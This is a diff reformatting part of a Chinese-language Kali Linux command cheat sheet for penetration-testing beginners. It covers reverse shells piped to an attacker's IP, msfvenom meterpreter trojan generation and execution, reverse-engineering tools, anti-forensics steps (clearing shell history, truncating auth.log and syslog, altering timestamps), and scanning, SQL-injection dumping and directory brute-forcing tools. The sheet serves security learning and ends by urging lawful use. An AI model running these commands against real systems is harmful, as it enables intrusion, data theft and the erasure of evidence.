@@ -283,50 +283,65 @@ Linux/Kali 常用命令速查表 - 适合安全行业初学者学习渗透测试
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 你的IP 4444 >/tmp/f
 	如果目标是 ncat（非 Kali 默认），可使用 -e 或：
    ncat -l -p 4444 --sh-exec /bin/bash
-7.反弹 shell（Windows）：nc ip 4444 -e cmd.exe
-8.msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f elf > shell.elf —— 生成 Linux 木马
-9.msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe > shell.exe —— 生成 Windows 木马
-10.chmod +x shell.elf; ./shell.elf —— 执行 Linux 木马
+7. **反弹 shell（Windows）**：`nc ip 4444 -e cmd.exe`
+
+8. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f elf > shell.elf`  
+   —— 生成 Linux 反向木马
+
+9. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe > shell.exe`  
+   —— 生成 Windows 反向木马
+
+10. `chmod +x shell.elf; ./shell.elf`  
+    —— 赋予 Linux 木马执行权限并运行
 
 ---
 
-##十二、逆向分析/恶意代码检测
+## 十二、逆向分析/恶意代码检测
 
-1.objdump -d file.elf —— 反汇编 ELF 文件
-2.readelf -a file.elf —— 查看 ELF 文件详细信息
-3ida64 —— 打开 IDA Pro 64 位（高阶逆向工具）
-4.radare2 file.elf —— 命令行逆向工具（轻量替代 IDA）
-5.strings file.exe —— 提取文件中的明文字符串
+1. `objdump -d file.elf` —— 反汇编 ELF 文件（Linux 程序）
+2. `readelf -a file.elf` —— 查看 ELF 文件的详细信息（段、节、导入表等）
+3. `ida64` —— 打开 IDA Pro 64 位逆向分析工具（高阶反汇编）
+4. `radare2 file.elf` —— 命令行逆向分析工具（轻量替代 IDA）
+5. `strings file.exe` —— 提取文件中的明文字符串（快速找漏洞线索）
+
+---
+
+## 十三、清理痕迹/反取证
+
+1. `history -c` —— 清空当前用户的命令历史记录
+2. `rm ~/.bash_history` —— 删除命令历史记录文件
+3. `: > /var/log/auth.log` 或 `truncate -s 0 /var/log/auth.log`  
+   —— 清空系统认证日志（推荐方式，更安全，不产生额外进程）
+4. `: > /var/log/syslog` —— 清空系统核心日志  
+   **注意**：清日志后系统仍会继续写入新日志；真正反取证需结合其他手段（如修改时间戳、删除日志文件后重建等）。
+5. `touch -t YYYYMMDDHHMM file` 或 `touch -d "2024-01-01 00:00" file`  
+   —— 修改文件的访问/修改时间戳（反取证常用）
 
 ---
 
-##十三、清理痕迹/反取证
-1.history -c —— 清空当前命令历史
-2.rm ~/.bash_history —— 删除历史记录文件
-3.: > /var/log/auth.log 或 truncate -s 0 /var/log/auth.log —— 清空认证日志（推荐）
-4.: > /var/log/syslog —— 清空系统日志
-注意：清日志后系统仍会继续写新日志；真正反取证需结合其他手段。
-5.touch -t YYYYMMDDHHMM file 或 touch -d "2024-01-01 00:00" file —— 修改文件时间戳
+## 十四、杂项渗透高频命令
+
+1. `chmod +x file` —— 给文件添加执行权限（木马/EXP 常用）
+2. `./file` —— 运行当前目录下的可执行文件
+3. `nc -zv ip 1-1000` —— 快速扫描目标 1-1000 端口是否开放  
+   （推荐使用 `nmap -p 1-1000 ip` 替代）
+4. `sqlmap -u "http://target.com?id=1" --dump` —— 检测 SQL 注入并导出数据库数据
+5. `dirb http://target.com` —— 爆破目标网站的目录和文件（较老工具）
+6. `dirsearch -u http://target.com -e php,html` —— 高级目录爆破（指定后缀）
+7. `gobuster dir -u http://target.com -w wordlist.txt` —— 高性能目录爆破工具（目前主流）
+8. `whatweb url` —— 探测目标网站的服务器、框架、插件版本
+9. `nikto -h ip` —— 扫描 Web 服务器的已知漏洞和敏感文件
+10. `metasploit-framework` —— 直接启动 Metasploit 框架
+11. `xterm` —— 打开新的终端窗口（多任务操作常用）
+12. `screen` —— 创建后台会话（断开连接后进程仍运行）
+13. `screen -r` —— 恢复后台的 screen 会话
+14. `reboot` —— 重启系统
+15. `shutdown -h now` —— 立即关闭系统
 
 ---
-##十四、杂项渗透高频命令
-1.chmod +x file —— 添加执行权限
-2../file —— 运行当前目录可执行文件
-3.nc -zv ip 1-1000 —— 快速扫描端口（推荐 nmap 替代）
-4.sqlmap -u "http://target.com?id=1" --dump —— SQL 注入检测 & 数据导出
-5.dirb http://target.com —— 目录爆破（较老）
-6.dirsearch -u http://target.com -e php,html —— 高级目录爆破
-7.gobuster dir -u http://target.com -w wordlist.txt —— 高性能目录爆破（目前主流）
-8.whatweb url —— 探测网站技术栈
-9.nikto -h ip —— 扫描 Web 服务器漏洞
-10.metasploit-framework —— 直接启动 Metasploit
-11.xterm —— 打开新终端窗口
-12.screen —— 创建后台会话（断开后进程继续运行）
-13.screen -r —— 恢复 screen 会话
-14.reboot —— 重启系统
-15.shutdown -h now —— 立即关机
 
-最后提醒
-这份速查表会随着工具更新而变化，建议定期查看 Kali 官网或工具的 --help。
-祝学习愉快，合法、安全地探索 Linux 与网络安全世界！
-Star & Fork 欢迎～
+**最后提醒**  
+这份速查表会随着工具、系统和内核版本更新而变化，建议定期查看 Kali 官网、各工具的 `--help` 或 `man` 页获取最新用法。  
+
+祝学习愉快，**合法、安全地探索 Linux 与网络安全世界**！  
+欢迎 Star & Fork ～
